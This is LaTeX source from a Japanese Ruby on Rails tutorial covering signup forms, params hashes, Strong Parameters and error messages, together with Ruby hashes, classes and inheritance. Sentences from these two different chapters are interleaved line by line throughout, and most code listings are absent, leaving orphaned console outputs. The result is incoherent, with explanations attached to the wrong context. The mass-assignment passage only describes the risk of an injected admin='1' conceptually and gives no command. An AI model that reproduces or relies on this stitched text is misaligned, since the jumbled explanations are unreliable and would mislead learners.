Userモデルの\kode{name}属性を設定する、ラベル付きテキストフィールド要素を作成するのに必要なHTMLを作成します
生成されたフォームのHTMLを見たい場合は、ブラウザ上で表示画面を右クリックし、出てきたポップアップ項目の中から [ソースを表示] といった項目をクリックしてください。WebページのHTMLソースはリスト\ref{code:signup_form_html}のようになります。
HTMLソースの中の、フォームを形成するHTML構造に注目してみましょう。
2つ目の記法は、シンボルとハッシュロケットの組み合わせを、以下のようにキーの名前の (前ではなく) 後にコロンを置き、その後に値が続くように置き換えたものです。
図\ref{fig:signup_form}のフォームのHTMLソース
この構成は、JavaScriptなど他の言語のハッシュ記法により近いものになっており、Railsコミュニティでも人気が高まっています。
どちらの記法もよく使われているので、両方の見分けがつくことが重要です。
まずはこのHTMLソースの内部構造について説明します。
ただ最初は少し見分けづらいのも事実です。たとえば\kode{:name}はシンボルとして独立していますが、引数を伴わない\kode{name:}では意味が成り立ちません。
リスト\ref{code:signup_form}とリスト\ref{code:signup_form_html}をじっくり見比べてみると、以下の埋め込みRubyは
以下のコードの\kode{:name =>}と\kode{name:}は、\emph{ハッシュとしてのデータ構造は}全く同じです。つまり、
以下のHTMLを生成していることがわかります。
というコードは等価になります (一般的には省略記法が好まれますが、明示的に接頭にコロンをつけてシンボル (\kode{:name}) であることを強調するという考え方もあります)。
次の図\ref{fig:filled_in_form}に示すように、テキストフィールド (\kode{type="text"}と\kode{type="email"}) では内容をそのまま表示していますが、パスワードフィールド (\kode{type="password"}) ではセキュリティ上の目的のために文字が隠蔽されています (図\ref{fig:filled_in_form})。
(emailフィールドとtextフィールドは同じように見えますが、細かな点が違います。たとえば、\kode{type="email"}となっている場合、モバイル端末から入力フォームをタップすると、メールアドレスに最適化された特別なキーボードが表示されるようになります。)
\kode{text}フィールドと\kode{password}フィールドに文字を入力した状態
\ref{sec:successful_signups}でも説明しますが、ユーザーの作成で重要なのは\kode{input}ごとにある特殊な\kode{name}属性です。
次に重要な要素は、\kode{form}タグ自身です。
これらの2つの属性は、HTTP \texttt{POST}リクエストに対する指示を構成しています。
これらの属性の効用については次の2つの節で説明します。
ところで、\kode{form} タグの内側で次のようなHTMLが生成されていたことにもお気付きでしょうか。
リスト\ref{code:nested_hashes}に示したように、ハッシュの値にはほぼ何でも使用することができ、他のハッシュを使用することすらできます。
このコードはブラウザ上では何も表示しませんが、Railsの内部で使用される特別なコードです。 したがって、どういった意図で生成されたのかは、現時点ではまだ理解しなくても大丈夫です。
ハッシュの中のハッシュ
動作の詳細を知りたい場合は、Stack Overflowの\href{http://stackoverflow.com/questions/941594/understand-rails-authenticity-token}{Rails信頼性トークン関連の書き込み (英語)} を参照してください。
図\ref{fig:signup_form}ではフォームのHTMLがどうなっているかを簡単に説明しました (リスト\ref{code:signup_form_html}参照) が、フォームを理解するには\emph{ユーザー登録の失敗のとき}が最も参考になります。
=> {:name=>"Michael Hartl", :email=>"mhartl@example.com"}
この節では、無効なデータ送信を受け付けるユーザー登録フォームを作成し、ユーザー登録フォームを更新してエラーの一覧を表示します。このモックアップを図\ref{fig:signup_failure_mockup}に示します。
=> {:user=>{:name=>"Michael Hartl", :email=>"mhartl@example.com"}}
ユーザー登録が失敗したときのモックアップ。
\label{fig:signup_failure_mockup}}<n>\end{figure}<n><n>    \subsection{正しいフォーム} % (fold)<n>    \label{sec:a_working_form}<n><n>
Railsでは、このようなハッシュのハッシュ (または\emph{ネストされたハッシュ}) が大量に使われています。実際の使用例は\ref{sec:unsuccessful_signups}で説明します。
\ref{sec:a_users_resource}で、\kode{resources :users}を\kode{routes.rb}ファイルに追加すると (リスト\ref{code:users_resource}) 自動的にRailsアプリケーションが表\ref{table:RESTful_users}のRESTful URI に応答するようになったことを思い出してください。
配列や範囲オブジェクトと同様、ハッシュも\kode{each}メソッドに応答します。
特に、/usersへの\texttt{POST}リクエストは\kode{create}アクションに送られます。
たとえば、\kode{:success}と\kode{:error}という 2つの状態を持つ \kode{flash} という名前のハッシュについて考えてみましょう。
私たちはここで、\kode{create}アクションでフォーム送信を受け取り、\kode{User.new}を使用して新しいユーザーオブジェクトを作成し、ユーザーを保存 (または保存に失敗) し、再度の送信用のユーザー登録ページを表示するという方法で機能を実装しようと思います。
"It worked!"
まずはユーザー登録フォームのコードを見直してみましょう。
It failed.
\ref{sec:the_form_html}で説明したように、このHTMLは\texttt{POST}リクエストを/usersというURLに送信します。
ユーザー登録フォームを動かすために、まずリスト\ref{code:first_create_action}にようにコードを追加するところから始めます。
このリストでは、\ref{sec:partials}の「パーシャル」のところでも使った\kode{render} メソッドを再度使いまわしています。\kode{render} はコントローラのアクションの中でも正常に動作します。
Key :success has value "It worked!"
ここで、以前に説明した\kode{if}-\kode{else}分岐構造を思い出してください。この文を使用して、保存が成功したかどうかに応じて\kode{@user.save}の値が\kode{true}または\kode{false} (\ref{sec:creating_user_objects}) になるときに、それぞれ成功時の処理と失敗時の処理を場合分けすることができます。
ユーザー登録の失敗に対応できる\kode{create}アクション
ここで、配列の\kode{each}メソッドでは、ブロックの変数は1つだけですが、ハッシュの\kode{each}メソッドでは、ブロックの変数は\emph{キー}と\emph{値}の2つになっていることに注意してください。
従って、 ハッシュに対して\kode{each}メソッドを実行すると、ハッシュの1つの「キーと値の\emph{ペア}」ごとに処理を繰り返します。
最後の例として、便利な\kode{inspect}メソッドを紹介します。これは要求されたオブジェクトを表現する文字列を返します。
[1, 2, 3, 4, 5]
# 保存の成功をここで扱う。
コメントにもあるように、上のコードはまだ実装が完了していませんので注意してください。
It worked!
しかし実装の出発点としてはこれで十分です。なお、最終的な実装は\ref{sec:strong_parameters}で完了します。
リスト\ref{code:first_create_action}のコードの動作を理解するもっともよい方法は、実際に無効なユーザー登録データを\emph{送信 (submit)}してみることです。
ところで、オブジェクトを表示するために\kode{inspect}を使用することは非常によくあることなので、 \kode{p}関数というショートカットがあります
結果を図\ref{fig:signup_failure}に、また、すべてのデバッグ情報を図\ref{fig:signup_failure_rails_debug}に示しました (読みやすいようにフォントサイズを拡大しています)。
実際には些細な違いがあり、\kode{p}メソッドは画面出力だけでなく返り値もオブジェクトになります。しかし、\kode{puts}メソッドの場合は引数によらず必ず\kode{nil}が返り値になります。
(�図\ref{fig:signup_failure}の下部に見えているのがRailsの\emph{web console}という機能です。これはrails consoleをブラウザ上で開けるようにし、デバッグをしやすくするための機能です。
(指摘してくれたKatarzyna Siwekに感謝します。)
たとえばUserモデルを調べたいときなどには便利ですが、今のところは \kode{params}の中身を精査するなどの込み入ったことはできません。)
ユーザー登録失敗
<n>\end{code}<n><n>    % subsection hashes_and_symbols (end)<n><n>    \subsection{CSS revisited} % (fold)<n>    \label{sec:css_revisited}<n><n>
それでは、もう一度リスト\ref{code:application_layout_redux}に戻り、レイアウトに CSS (cascading style sheet) を追加する以下の行を見てみましょう。
ユーザー登録失敗時のデバッグ情報
今なら、このコードを理解できるようになったはずです。
Railsが送信を扱う方法をより深く理解するために、デバッグ情報のうちパラメーターハッシュの\kode{user}の部分を詳しく見てみましょう (図\ref{fig:signup_failure_rails_debug})。
As mentioned briefly in Section \ref{sec:motivation}, Rails defines a special function to include stylesheets, and
このハッシュはUsersコントローラに\kode{params}として渡されます。\ref{sec:a_users_resource}で説明したとおり、この\kode{params}ハッシュには各リクエストの情報が含まれています。
上のコードでは、この関数を呼んでいます。
ユーザー登録情報の送信の場合、\kode{params}には複数のハッシュに対するハッシュ (hash-of-hashes: 入れ子になったハッシュ) が含まれます (なお、\ref{sec:hashes_and_symbols}ではhash-of-hashesの説明とともに、コンソールセッションで使用するためにあえて\kode{params}という名前の変数を導入しました)。
しかし、ここで不思議な点がいくつもあります。
上のデバッグ情報では、フォーム送信の結果が、送信された値に対応する属性とともに\kode{user}ハッシュに保存されています。ハッシュのキーは、\kode{input}タグの\kode{name}属性です (リスト\ref{code:signup_form})。
第一に、丸かっこがありません。
実は、Ruby では丸かっこは使用してもしなくても構いません。以下の2つの行は同等です。
\kode{"user[email]"}という名前は、\kode{user}ハッシュの\kode{email}属性を正確に指します。
# 関数呼び出しの丸かっこは省略可能。
これはリスト\ref{code:first_create_action}で使用されていました。
次に、\kode{:media}引数はハッシュのようですが、波かっこがない点が不思議です。
これはつまり、以下の行は
実は、ハッシュが関数呼び出しの\emph{最後の}引数である場合は、波かっこを省略できます。以下の2つの行は同等です。
以下とほぼ等価であるということです。
# 最後の引数がハッシュの場合、波かっこは省略可能。
以前のバージョンのRailsでは、以下のコードは
実際に動作しましたが、動作はデフォルトで不安定であり、悪意のあるユーザーによってアプリケーションのデータベースが書き換えられることのないように慎重な手続きによって使用しなければならず、しかもその手続はエラーを起こしやすいものでした。
次に、\kode{data-turbolinks-track}におけるキーと値のペアの表記が、旧式のハッシュロケット (=>) スタイルになっている点が不思議です。
実は、以下のような新しいハッシュ記法を使用すると、
Rails 4.0以降では、上のコードはエラーになります (上の図\ref{fig:signup_failure}および図\ref{fig:signup_failure_rails_debug}を参照)。これにより、デフォルトでのセキュリティが高められました。
<n><n>    % subsection a_working_form (end)<n><n>    \subsection{Strong Parameters} % (fold)<n>    \label{sec:strong_parameters}<n><n>
ハイフン (-) が入っているためにエラーが発生してしまいます。
\ref{sec:a_user_class}で、\emph{マスアサインメント}の概念について簡単に説明しました。これは、以下のように値のハッシュを使用してRubyの変数を初期化するものです。
(\ref{sec:hashes_and_symbols}で、シンボルにハイフンが使えなかったことを思い出してください)
このため、以下のような旧式のハッシュロケット記法を使用するしかないのです。
リスト\ref{code:first_create_action}のコメントと、上の再録コメントでも重ねて指摘しているように、この実装は最終形ではありません。
その理由は、\kode{params}ハッシュ全体を初期化するという行為はセキュリティ上、\emph{極めて}危険だからです。これは、ユーザーが送信したデータを\emph{まるごと}\kode{User.new}に渡していることになります。
最後に、Rubyが以下のようなコードを正常に実行できているのが不思議です。
ここで、Userモデルに\kode{admin}属性というものがあるとしましょう。この属性は、Webサイトの管理者であるかどうかを示します
上のコードには途中に改行が含まれているにもかかわらずです。
(この属性を実装するのは\ref{sec:administrative_users}になってからです)。
実は、Rubyは改行と空白を区別していません
\kode{admin=’1’}という値を\kode{params[:user]}の一部に紛れ込ませて渡してしまえば、この属性を\kode{true}にすることができます。これは\texttt{curl}などのコマンドベースのHTTPクライアントを使用すれば簡単に行うことができます。
改行は、行の末尾と次の行の始まりを示します。
行を分割した\emph{理由}は、1行を80字以内に収めてソースコードを読みやすくするためです
\kode{params}ハッシュがまるごと\kode{User.new}に渡されてしまうと、どのユーザーでも\kode{admin=’1’}をWebリクエストに紛れ込ませるだけでWebサイトの管理者権限を奪い取ることができてしまいます。
もちろん、人間がいちいち文字数を\emph{数えて}いたら頭がどうにかなってしまいます。だからこそ、多くのテキストエディタにはこれらを支援する機能が備わっています。
以前のバージョンのRailsでは、\kode{モデル}層で\emph{attr\_accessible}メソッドを使用することで上のような危険を防止していましたが、 Rails 4.0ではコントローラ層で\emph{Strong Parameters}というテクニックを使用することが推奨されています。
たとえば、図\ref{fig:cloud9_gemfile},をもう一度見てみると、コードを80文字以下に抑えるための小さな縦線が右側に見えます。
Strong Parametersを使用することで、\emph{必須}のパラメータと\emph{許可された}パラメータを指定することができます。
\ref{sec:development_environment}で紹介したCloud IDEでは、デフォルトでこのような行が含まれます。
さらに、上のように\kode{params}ハッシュをまるごと渡すとエラーが発生するので、Railsはデフォルトでマスアサインメントの脆弱性から守られるようになりました。
TextMateを使用していれば、\texttt{View > Wrap Column > 78}で設定できます。
Sublime Textを使用していれば、\texttt{View > Ruler > 78}、または\texttt{View > Ruler > 80}で設定できます。
この場合、\kode{params}ハッシュでは\kode{:user}属性を必須とし、名前、メールアドレス、パスワード、パスワードの確認の属性をそれぞれ許可し、それ以外を許可しないようにしたいと考えています。
従って、
上のコードでは\kode{stylesheet\_link\_tag}関数を2つの引数で呼んでいます。最初の引数である文字列は、スタイルシートへのパスを示しています。次の引数であるハッシュには2つの要素があり、最初の要素はメディアタイプを示し、次の要素はRails 4.0で追加された\href{https://github.com/rails/turbolinks}{turbolinks}という機能をオンにしています。
このコードの戻り値は、\kode{params}ハッシュのバージョンと、許可された属性です (\kode{:user}属性がない場合はエラーになります)。
(CSSファイル名の後に、\kode{?body=1}のような行が余分に表示されていることがあります。
これらのパラメータを使いやすくするために、\kode{user\_params}という外部メソッドを使用するのが慣習になっています。このメソッドは適切に初期化したハッシュを返し、\kode{params[:user]}の代わりとして使用されます。
これらはRailsによって挿入されているもので、サーバー上で変更があった場合にブラウザがCSSを再読み込みするのに使用します。)
この\kode{user\_params}メソッドはUsersコントローラの内部でのみ実行され、Web経由で外部ユーザーにさらされる必要はないため、リスト\ref{code:create_action_strong_parameters}に示すようにRubyの\kode{private}キーワードを使って\kode{外部から使用できない}ようにします
インクルードされたCSSによって生成されたHTMLソース。
(\kode{private}キーワードの詳細については \ref{sec:remember_me}で説明します)。
We’ll set about changing this in Chapter \ref{cha:filling_in_the_layout}.
Rubyではあらゆるものがオブジェクトであるということは既に説明しましたが、この節では実際にオブジェクトをいくつか定義してみましょう。
\kode{create}アクションでStrong Parametersを使用する
Rubyは、多くのオブジェクト指向言語と同様、メソッドをまとめるのに\emph{クラス}を使用しています。これらのクラスから\emph{インスタンスが生成される}ことでオブジェクトが作成されます。
オブジェクト指向プログラミングの経験がない方にとっては何のことだかわからないと思いますので、いくつかの具体例を示すことにします。
<n><n><n>    \subsection{コンストラクタ} % (fold)<n>    \label{sec:constructors}<n><n>
実は、これまで示した多くの例の中でも、クラスを使用してオブジェクトのインスタンスを作成してきたのですが、オブジェクトを作成するところを明示的に説明していませんでした。
たとえば、ダブルクォートを使って文字列のインスタンスを作成しましたが、これは文字列のオブジェクトを暗黙で作成する\emph{リテラルコンストラクタ}です。
=> String
上のコードでは、文字列が\kode{class}メソッドに応答しており、その文字列が所属するクラスを単に返していることがわかります。
暗黙のリテラルコンストラクタを使う代わりに、明示的に同等の\emph{名前付きコンストラクタ}を使うことができます。名前付きコンストラクタは、クラス名に対して\kode{new}メソッドを呼び出します
ちなみに、\kode{private}キーワード以降のコードを強調するために、\kode{user\_params}のインデントを1段深くしてあります。
このメソッドの動作は、使用しているRubyのバージョンによって異なる可能性があります。
(経験的にはこれは賢い慣習だと思います。というのも、クラス内に多数のメソッドがある場合、privateメソッドの場所が簡単に見つかるからです。これにより、インデントが無い場合と比べて、どこからprivateになるのか困惑することがなくなります。)
この例ではRuby 1.9.3以上のバージョンを前提としています。
この時点で、(送信ボタンを押してもエラーが出ないという意味で) ユーザー登録フォームは動くようになります。
ただし図\ref{fig:invalid_submission_no_feedback}が示すように、(開発者用のデバッグ領域を除いて)  間違った送信をしても何もフィードバックが返ってきていません。これはユーザーが困惑する原因となります。
また、有効なユーザー情報を送信しても新しいユーザーが実際に作成されることもありません。
前者の問題を\ref{sec:signup_error_messages}で、後者の問題を\ref{sec:successful_signups}でそれぞれ解決していきます。
この動作はリテラルコンストラクタと同等ですが、動作の内容が明確に示されています。
無効な情報をユーザー登録フォームで送信した結果
配列でも、文字列と同様にインスタンスを生成できます。
=> [1, 3, 2]
ユーザー登録に失敗した場合の最後の手順として、問題が生じたためにユーザー登録が行われなかったということをユーザーにわかりやすく伝えるエラーメッセージを追加しましょう。
ただし、ハッシュの場合は若干異なります。
Railsは、このようなメッセージをUserモデルの検証時に自動的に生成してくれます。
配列のコンストラクタである\kode{Array.new} は配列の初期値を引数に取りますが、 \kode{Hash.new} はハッシュの\emph{デフォルト} 値を引数に取ります。これは、キーが存在しない場合のデフォルト値です。
たとえば、ユーザー情報のメールアドレスが無効で、パスワードが短すぎる状態で保存しようとしたとします。
=> ["Email is invalid", "Password is too short (minimum is 6 characters)"]
メソッドがクラス自身 (この場合は\kode{new}) に対して呼び出されるとき、このメソッドを\emph{クラスメソッド}と呼びます。
クラスの\kode{new}メソッドを呼び出した結果は、そのクラスのオブジェクトであり、これはクラスの\emph{インスタンス}とも呼ばれます。
\kode{length}のように、インスタンスに対して呼び出すメソッドは\emph{インスタンスメソッド}と呼ばれます。
クラスについて学ぶとき、\emph{superclass}メソッドを使って\kode{クラス階層}を調べてみるとよくわかります。
\ref{sec:presence_validation}で少し触れた \kode{errors.full\_messages}オブジェクトは、 エラーメッセージの配列を持っています。
上のコンソールセッションに示されているように、リスト\ref{code:first_create_action}で保存に失敗すると、\kode{@user}オブジェクトに関連付けられたエラーメッセージの一覧が生成されます。
=> Object
このメッセージをブラウザで表示するには、ユーザーの\kode{new}ページでエラーメッセージのパーシャル (partial) を出力します。このとき、\kode{form-control}というCSSクラスも一緒に追加することで、Bootstrapがうまく取り扱ってくれるようになります。変更の結果をリスト\ref{code:f_error_messages}に示します。
=> BasicObject
ここで使用しているエラーメッセージのパーシャルはあくまで試作品である点に注意してください。最終版は\ref{sec:creating_microposts}を参照してください。
ユーザー登録失敗時にエラーメッセージが表示されるようにする
継承階層を図\ref{fig:string_inheritance_ruby_1_9}に示します。
ここでは、\kode{String}クラスのスーパークラスは\kode{Object}クラスで、\kode{Object}クラスのスーパークラスは\kode{BasicObject}クラスですが、 \kode{BasicObject}クラスはスーパークラスを持たないことがわかります。
この図式は、すべての Ruby のオブジェクトにおいて成り立ちます。クラス階層をたどっていくと、 Rubyにおけるすべてのクラスは最終的にスーパークラスを持たない\kode{BasicObject}クラスを継承しています。
これが、"Rubyではあらゆるものがオブジェクトである" ということの技術的な意味です。
\kode{String}クラスの継承階層
ここでは、\kode{’shared/error\_messages’}というパーシャルを\kode{render} (レンダリング) している点に注目してください。これはRails全般の慣習で、パーシャルは複数のコントローラにわたるビューに対し、専用の\kode{shared/}ディレクトリを使用するようにしています
クラスについての理解を深めるには、自分でクラスを作成してみるのが一番です。
(これは\ref{sec:edit_form}で実現します)。
そこで、\kode{Word}クラスを作成し、その中に、ある単語を前からと後ろからのどちらから読んでも同じ (つまり回文になっている) ならば\kode{true}を返す\kode{palindrome?}メソッドを作成してみましょう。
ただし、今はまだ\kode{app/views/shared}といったディレクトリは作っていないので、表\ref{table:unix_commands}で紹介した\kode{mkdir}コマンドを使い、新しくディレクトリを作成する必要があります。
パーシャルの内容はリスト\ref{code:errors_partial}のようになります。
このクラスとメソッドは以下のように使うことができます。
フォーム送信時にエラーメッセージを表示するためのパーシャル
=> #<Word:0x22d0b20>
もし上の例が少し不自然に思えるならば、勘が鋭いといえます。というのも、これはわざと不自然に書いたからです。
パーシャルによって、RailsとRubyには、Railsエラーオブジェクト用の2つのメソッドを含む多くの成果物が導入されました。
文字列を引数に取るメソッドを作るためだけに、わざわざ新しいクラスを作るのは変です。
最初は\kode{count}メソッドを紹介します。これはエラーの数を返します。
単語\emph{は}文字列なので、リスト\ref{code:word_class}のように\kode{Word}クラスは \kode{String}クラスを\emph{継承}するのが自然です
もう1つは\kode{any?}メソッドです。これは\kode{empty?}メソッドと互いに補完します。
(以下のリストを入力する前に、古い\kode{Word}クラスの定義を消去するために、Railsコンソールをいったん終了してください)。
コンソールで\kode{Word}クラスを定義する。
\ref{sec:objects_and_message_passing}では文字列に対して\kode{empty?}メソッドを使用しましたが、Railsのエラーオブジェクトに対しても使用できます。オブジェクトが空の場合は\kode{true}、 それ以外の場合は \kode{false}を返します。
\kode{any?}メソッドはちょうど\kode{empty?}と逆の動作で、要素が1つでもある場合は\kode{true}、ない場合は\kode{false}を返します。
(なお、これらの\kode{count}、\kode{empty?}、\kode{any?}メソッドは、Rubyの配列に対してもそのまま使用できます。
\ref{sec:static_pages}でも簡単に説明しましたが、上のコードのは継承のためのRubyの \kode{Word < String} 記法です。こうすることで、新しい\kode{palindrome?}メソッドだけではなく、Stringクラスで使用できるすべてのメソッドをWordクラスに対しても使用できるようになります。
これは\ref{sec:showing_microposts}で応用する予定です。)
さらに、\kode{pluralize}という英語専用のテキストヘルパーが新たに登場しています。
=> "level"
=> "1 error"
# Wordが鏡文字かどうか
=> "5 errors"
\kode{pluralize}の最初の引数に整数が与えられると、それに基づいて2番目の引数の英単語を複数形に変更したものを返します。
このメソッドの背後には強力な\emph{インフレクター (活用形生成) } があり、不規則活用を含むさまざまな単語を複数形にすることができます。
\kode{Word}クラスは\kode{String}クラスを継承しているので、コンソールを使用してクラス階層を明示的に確認できます。
=> "2 women"
=> Word
=> "3 errata"
\kode{pluralize}を使用することで、コードは以下のようになります。
このコードはたとえば \kode{"0 errors"}、\kode{"1 error"}、\kode{"2 errors"} などのように、エラーの数に応じて活用された単語を返します。これにより、\kode{"1 errors"} のような英語の文法に合わない文字列を避けることができます (これはWeb上でどうしようもないほどよく見かけるエラーです)。
図\ref{fig:word_inheritance_ruby_1_9}にこのクラス階層を示します。
The inheritance hierarchy for the (non-built-in) \kode{Word} class from Listing \ref{code:word_class}.
さらにRailsは、無効な内容で送信がされて元のページに戻されると、\kode{div}で囲まれたエラー用のCSSクラス\kode{field\_with\_errors}を返します。
リスト\ref{code:word_class}では、単語の文字を逆順にしたものが元の単語と同じであるかどうかのチェックを、\kode{Word}クラスの中から自分自身が持つ単語にアクセスすることで行なっていることにご注目ください。
これらのラベルによって、リスト\ref{code:error_messages_css}のようにエラーメッセージをSCSSで整形することができます。ここでは、Sassの\kode{@extend}関数を使ってBootstrapの\kode{has-error}というCSSクラスを適用してみます。
Rubyでは、\kode{self}キーワードを使用してこれを指定することができます。\kode{Word}クラスの中では、\kode{self}はオブジェクト自身を指します。これはつまり、以下のコードを使用して、
エラーメッセージにスタイルを与えるためのCSS
単語が回文であるかどうかを確認できるということです
リスト\ref{code:f_error_messages}とリスト\ref{code:errors_partial}のコードと、SCSSのリスト\ref{code:error_messages_css}を組み合わせることで、無効なユーザー登録情報を送信したときのエラーメッセージが分かりやすくなります (図\ref{fig:signup_error_messages})。
Rubyのクラスや\kode{self}についてもっと詳しく知りたい場合は、\href{http://railstips.org/}{RailsTips}に投稿された “\href{http://railstips.org/blog/archives/2006/11/18/class-and-instance-variables-in-ruby/}{Rubyにおけるクラスとインスタンス変数}” (英語) を参照してください。
これらのメッセージはモデルの検証時に生成されるので、メールアドレスのスタイルやパスワードの最小文字列などを変更すると、メッセージも自動的に変更されます。[BR]<n>[BR]<n>(このとき、存在性のバリデーションもhas\_secure\_passwordによるバリデーションも空のパスワードを検知してしまうため、ユーザー登録フォームで空のパスワードを入力すると2つの同じエラーメッセージが表示されてしまいます。もちろんこういった冗長なエラーメッセージを直接修正することも可能ですが、幸運にも今回の場合は、後ほど追加する allow\_nil: true というオプションでこの問題は解決できます。)
なお、Stringクラスの内部では、メソッドや属性を呼び出すときの\kode{self.}も省略可能です。
といった省略記法でも、うまく動きます。
継承は強力な概念ですが、もし仮に継承を使用せずに\kode{palindrome?}メソッドを\kode{String}クラス自身に追加する (つまりStringクラスを拡張する) という、より自然な方法を使用することが可能だとしたら、わざわざWordクラスを作らなくても\kode{palindrome?}をリテラル文字列に対して直接実行できるようになるはずです。そんなことが可能なのでしょうか (なお、現在のコードはそのようになっていないため、以下のようにエラーになります)。
ユーザー登録失敗時のエラーメッセージ
NoMethodError: undefined method `palindrome?'
完全なテスト機能を備えた強力なWebフレームワークがなかった頃は、開発者はフォームのテストを毎回手動で行う必要がありました。
 for "level":String
たとえば、もし仮にユーザー登録ページを手動でテストしなければならないとしたら、ブラウザでそのページを表示し、有効なデータと無効なデータを交互に流しこみ、どちらの場合にもアプリケーションが正常に動作することを確認しなければならないでしょう。
驚いたことに、Rubyでは組み込みの基本クラスの拡張が可能なのです。Ruby のクラスは\emph{オープン}で変更可能であり、クラス設計者でない開発者でもこれらのクラスにメソッドを自由に追加することが許されています
さらに、アプリケーションに変更が生じるたびに、まったく同じテストを繰り返さなければなりません。
このプロセスは苦痛で、バグも発生しがちです。
しかし幸運なことに、Railsではフォーム用のテストを書くことができ、こういったプロセスを自動化することができます。
本項では、無効な送信をしたときの正しい振る舞いについてテストを書いていきます。\ref{sec:a_test_for_valid_submission}では同様の方法で、有効な送信をしたときの正しい振る舞いについてテストを書いていきます。
まずは、新規ユーザー登録用の統合テストを生成するところから始めていきます。コントローラーの慣習である「リソース名は複数形」に因んで、統合テストのファイル名は\kode{users\_signup}とします。
(Rubyで組み込みクラスにメソッドを追加できるということは実にクールですが、\kode{"deified"} (=神格化された) という単語が回文になっていることも、それに劣らずクールではないでしょうか。)
組み込みクラスの変更はきわめて強力なテクニックですが、大いなる力には大いなる責任が伴います (訳注: 「スパイダーマン」の名台詞)。従って、\emph{真に}正当な理由がない限り、組み込みクラスにメソッドを追加することは無作法であると考えられています。
Railsの場合、組み込みクラスの変更を正当化できる理由がいくつもあります。たとえば、Web アプリケーションでは、変数が絶対に\emph{空白}にならないようにしたくなることがよくあります (ユーザー名などはスペースや\href{http://en.wikipedia.org/wiki/Whitespace_(computer_science)}{その他の空白文字}になって欲しくないものです) ので、Railsは\kode{blank?}メソッドをRuby に追加しています。
(\ref{sec:a_test_for_valid_submission}で書くテストでも、ここで生成したファイルを使います)
Railsの拡張は自動的にRailsコンソールにも取り込まれるので、以下のようにコンソールで拡張の結果を確認できます (注意: 以下のコードは純粋な \kode{irb} では動作しません)。
このテストでは、ユーザー登録ボタンを押したときに (ユーザー情報が無効であるために) ユーザーが\emph{作成されない}ことを確認します。
(なお、エラーメッセージに対するテストは\ref{sec:signup_exercises}の演習に残しておきます。)
これを確認するには、ユーザーの\emph{count}を使用します。背後で動作するこの\kode{count}メソッドは、\kode{User}を含むあらゆるActive Recordクラスで使用できます。
\ref{sec:signup_form}の冒頭でデータベースをリセットしてあるので、現時点では\kode{User.count}は\kode{0}になっています。
スペースが集まってできた文字列は\emph{空 (empty) }とは認識されませんが、\emph{空白 (blank) }であると認識されていることがわかります。
\ref{sec:layout_link_tests}のように、 \kode{assert\_select}を使って関連ページのHTML要素をテストしていきます。これにより、今後うっかり要素を変更してしまっても気付けるようになります。
ここで、\kode{nil}は空白と認識されることに注意してください。\kode{nil}は文字列ではないので、Railsが実は\kode{blank?}メソッドを\kode{String}クラスではなく、そのさらに上の基底クラスに追加していることが推測できます。その基底クラスとは、(この章の最初で説明した) \kode{Object}自身です。
まずは\kode{get}メソッドを使ってユーザー登録ページにアクセスします。
RailsによってRubyの組み込みクラスに追加が行われている例については、\ref{sec:remember_me}で説明します。
フォーム送信をテストするためには、 \texttt{users\_path}に対して\kode{POST}リクエストを送信する必要があります (表\ref{table:RESTful_users})。これは、次のように\texttt{post}関数を使って実現できます
これまでクラスや継承について説明してきましたが、これらの話は前の章にもあったような気がします。{それもそのはずで、StaticPagesコントローラで継承やクラスについて触れたことがありました (リスト\ref{code:adding_the_about_page})。
\kode{create}アクションの\kode{User.new} (リスト\ref{code:signup_flash})で期待されているデータを、\kode{params[:user]}というハッシュにまとめています。
すなわちこのテストは、ユーザ数を覚えた後に、データを投稿してみて、ユーザ数が変わらないかどうかを検証するテストになります。したがって、以下のコードと等価になります。
これらのコードは等価ではありますが、\kode{assert\_no\_difference}を使う方が明瞭で、Rubyの慣習的にも正しいです。
Rails コンソールは、セッションごとにローカルのRails環境を読み込むので、コンソール内で明示的にコントローラを作成したり、そのクラス階層を調べたりすることができます
また、上のコードでは\kode{get}関数を使っていないことにも注目してください。これは各関数に技術的な関連性がなく、ユーザー登録ページにアクセスしなくても、直接\kode{post}関数を呼び出してユーザー登録ができることを意味しています。
これらの階層にあるクラスの詳細を知る必要はないと思います。
個人的には、コンセプトを明確にする意味とユーザー登録ページをダブルチェックする意味も兼ねて、 (実際の手順に倣って) 両方の関数を呼び出す方が好きです。
\emph{私ですら}それらのクラスの詳細について知らないことがたくさんありますし、それでも私は2005年からRuby on Railsで問題なくプログラミングできています。
上記のアイデアをコードに落とし込むと、リスト\ref{code:a_test_for_invalid_submission}のようになります。
これは (a) 私がよほど無能であるか、(b) Railsの内部を知りつくさなくても熟練したRails開発者になれる、ということのどちらかでしょう。
なお、送信に失敗したときに\kode{new}アクションが再描画されるはずなので、\kode{assert\_template}を使ったテストも含めていることに注意してください。
私のためにも読者の皆様のためにも、後者であることを祈ります。
エラーメッセージが正しく表示されているかどうかについては、演習として残しておきます (\ref{sec:signup_exercises})。
=> #<StaticPagesController:0x22855d0>
無効なユーザー登録に対するテスト
=> StaticPagesController
=> ApplicationController
アプリケーションコードは既に実装済みなので、今回の統合テストも含め、全てのテストが \passing になるはずです。
=> ActionController::Base
=> ActionController::Metal
=> AbstractController::Base
無効なフォームの送信を扱えるようになったので、いよいよ新規ユーザーを実際にデータベースに保存できるようにし (もちろんフォームが有効な場合に)、ユーザー登録フォームを完成させましょう。
まずは、ユーザーを保存できるようにします。保存に成功すると、ユーザー情報は自動的にデータベースに登録されます。次にブラウザの表示を\emph{リダイレクト}して、登録されたユーザーのプロファイルを表示します。ついでにウェルカムメッセージも表示しましょう。モックアップを図\ref{fig:signup_success_mockup}に示します。
継承の関係を図\ref{fig:static_pages_controller_inheritance}に示します。
保存に失敗した場合は、単に\ref{sec:unsuccessful_signups}で開発したとおりの動作が実行{されます。
ユーザー登録に成功した画面のモックアップ
StaticPagesコントローラの継承階層
\label{fig:signup_success_mockup}}<n>\end{figure}<n><n>    \subsection{登録フォームの完成} % (fold)<n>    \label{sec:the_finished_signup_form}<n><n>
ユーザー登録フォームを完成させるために、リスト\ref{code:create_action_strong_parameters}のコメントアウトされた部分にコードを書き、適切に動作するようにしましょう。
現状では、有効な情報で送信するとエラーが発生してしまいます。
Railsコンソールでは、その中からコントローラのアクション (実はメソッド) を呼ぶこともできます。
図\ref{fig:valid_submission_error}が示すように、Railsのデフォルトのアクションは対応するビューを表示するようになっています。しかし\kode{create}アクションに対応するビューのテンプレートがないため (あるはずがありません)、このようなエラーが発生しています。
有効な情報でユーザー登録をしてもエラーメッセージが表示される
ここでは、\kode{home}アクションの中身は空なので\kode{nil}が返されます。
